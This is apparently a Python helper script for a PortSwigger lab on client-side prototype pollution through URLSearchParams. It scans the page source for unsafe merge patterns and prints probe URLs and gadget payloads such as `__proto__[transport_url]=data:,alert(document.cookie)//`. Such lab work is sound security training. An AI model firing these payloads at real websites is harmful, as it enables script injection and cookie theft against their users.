"""
Lab 3: Client-side prototype pollution via browser APIs
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-browser-apis
Difficulty: Practitioner

📝 The pollution source is a browser API return value — commonly
`new URLSearchParams(location.search)` iterated with `for...of` or
`.entries()` into a plain object — rather than a hand-rolled parser. Same
underlying unsafe-merge pattern, just reached through a standard API most
developers assume is inherently safe.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking specifically for URLSearchParams usage feeding a merge —")
    note("this is the lab's whole point: the API itself looks safe, the")
    note("merge logic built around its output isn't.")
    grep_for_patterns(source, ["URLSearchParams", "entries()", "Object.assign", "merge"])

    probe = f"{TARGET}/?__proto__[test]=polluted"
    log(f"Pollution probe: {probe}")
    note("Confirm via console, then hunt for this lab's specific gadget —")
    note("open the page's JS and search for any property read with no")
    note("explicit prior assignment (the tell-tale pattern for an unguarded")
    note("prototype-chain read). Try the common candidates first:")
    for prop in ["transport_url", "unsafe", "html"]:
        print(f"  {TARGET}/?__proto__[{prop}]=data:,alert(document.cookie)//")


if __name__ == "__main__":
    run()
